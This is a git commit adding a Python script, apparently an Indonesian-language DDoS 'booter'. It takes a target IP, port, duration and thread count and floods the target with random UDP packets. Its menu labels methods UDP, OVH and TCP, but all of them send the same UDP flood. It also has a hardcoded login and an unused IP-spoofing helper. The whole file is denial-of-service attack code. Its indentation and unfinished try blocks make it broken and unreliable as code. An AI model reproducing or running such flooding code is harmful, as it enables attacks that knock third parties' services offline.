47900f45e877884c9049e8a9c840a895cdf157b4
AxeLOREZ <107378369+AxeLOREZ@users.noreply.github.com>
2022-08-05 05:52:06 +0700

    Add files via upload

---
+++ AURC2.py
@@ -0,0 +1,315 @@
+import os
+import codecs
+import sys
+import random
+import threading
+import time
+import socket
+from time import time as tt
+
+os.system("clear")
+
+print("""\033[91m
+
+██╗░░██╗░█████╗░██╗░░░██╗██████╗░
+╚██╗██╔╝██╔══██╗██║░░░██║╚════██╗
+░╚███╔╝░███████║╚██╗░██╔╝░░███╔═╝
+░██╔██╗░██╔══██║░╚████╔╝░██╔══╝░░
+██╔╝╚██╗██║░░██║░░╚██╔╝░░███████╗
+╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝
+""")
+
+username = str(input("\033[94m[XAV2] \033[93mUsername:"))
+password = str(input("\033[94m[XAV2] \033[93mPassword:"))
+if password == "Aurasayang" and username == "Aurasayang":
+    print ("Telah Masuk Sebagai Aura")
+    time.sleep(2)
+
+else:
+    print ("Passwordnya Salah Bruh.")
+    time.sleep(999)
+
+os.system("clear")
+print("\033[92mConnecting To Server [\033[97m•\033[92m]")
+time.sleep(0.10)
+
+
+nicknm = "AxeLL"
+
+mt = """\033[96mUnder \033[0;93mmaintance"""
+
+os.system("clear")
+
+print("""\033[94m
+
+██████████████████████████████████████████
+█▄─▀█▀─▄█▄─▄▄─█─▄─▄─█─█─█─▄▄─█▄─▄▄▀█─▄▄▄▄█
+██─█▄█─███─▄█▀███─███─▄─█─██─██─██─█▄▄▄▄─█
+▀▄▄▄▀▄▄▄▀▄▄▄▄▄▀▀▄▄▄▀▀▄▀▄▀▄▄▄▄▀▄▄▄▄▀▀▄▄▄▄▄▀
+""")
+print("""\033[92m
+| UDP             |
+| OVH             |
+| UDP-DOWN        |
+| TCP             |
+———————————————————
+""")
+
+ip = str(input("\033[91m====> ★ IP   : "))
+port = int(input("====> $ PORT   : "))
+time = int(input("====> $ PACKET   : "))
+threads = int(input("====> $ THREADS   : "))
+choice = str(input("====> ★ METHODS   : "))
+
+os.system("clear")
+
+def run():
+    print("\033[92m ★★★★ DARI AXEL EUYY ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(666, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+ 
+	while True:
+		try:
+	       port = port or random.randint(1, 65535)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def run2():
+    print("\033[92m ★★★★ DARI AXEL EUYY ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(666, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+ 
+	while True:
+		try:
+	       port = port or random.randint(1, 65535)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+def run3():
+    print("\033[92m ★★★★ DARI AXEL EUYY ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(666, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+ 
+	while True:
+		try:
+	       port = port or random.randint(1, 65535)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+			
+def run4():
+    print("\033[92m ★★★★ DARI AXEL EUYY ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(666, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+ 
+	while True:
+		try:
+	       port = port or random.randint(1, 65535)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def run5():
+    print("\033[92m ★★★★ DARI AXEL EUYY ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(666, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+ 
+	while True:
+		try:
+	       port = port or random.randint(1, 65535)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def run6():
+    print("\033[92m ★★★★ DARI AXEL EUYY ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(666, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+ 
+	while True:
+		try:
+	       port = port or random.randint(1, 65535)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def run7():
+    print("\033[92m ★★★★ DARI AXEL EUYY ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(666, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+ 
+	while True:
+		try:
+	       port = port or random.randint(1, 65535)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+    def spoofer():
+    addr = [192, 168, 0, 1]
+    d = '.'
+    addr[0] = str(random.randrange(11, 197))
+    addr[1] = str(random.randrange(0, 255))
+    addr[2] = str(random.randrange(0, 255))
+    addr[3] = str(random.randrange(2, 254))
+    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
+    return assemebled
+
+for y in range(threads):
+	if choice == 'UDP':
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+		th = threading.Thread(target = run3)
+		th.start()
+	if choice == 'UDPDOWN':
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+		th = threading.Thread(target = run3)
+		th.start()
+	if choice == 'TCP':
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+	if choice == 'tcp':
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+	if choice == 'OVHDOWN':
+		th = threading.Thread(target = run4)
+		th.start()
+		th = threading.Thread(target = run5)
+		th.start()
+	if choice == 'ovhdown':
+		th = threading.Thread(target = run4)
+		th.start()
+		th = threading.Thread(target = run5)
+		th.start()
+	if choice == 'OVH':
+		th = threading.Thread(target = run4)
+		th.start()
+		th = threading.Thread(target = run5)
+		th.start()
+	if choice == 'ovh':
+		th = threading.Thread(target = run4)
+		th.start()
+		th = threading.Thread(target = run5)
+		th.start()
+else:
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+		th = threading.Thread(target = run3)
+		th.start()
+		th = threading.Thread(target = run4)
+		th.start()
+		th = threading.Thread(target = run5)
+		th.start()
+		th = threading.Thread(target = run6)
+		th.start()
+		th = threading.Thread(target = run7)
